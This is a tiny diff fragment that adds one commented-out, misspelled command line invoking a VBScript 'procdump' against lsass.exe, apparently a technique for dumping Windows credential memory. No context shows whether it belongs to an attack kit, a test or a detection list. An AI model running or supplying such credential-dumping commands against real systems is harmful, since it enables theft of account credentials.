@@ -1,0 +1,1 @@
+#csript procdump.vbs lsass.exe
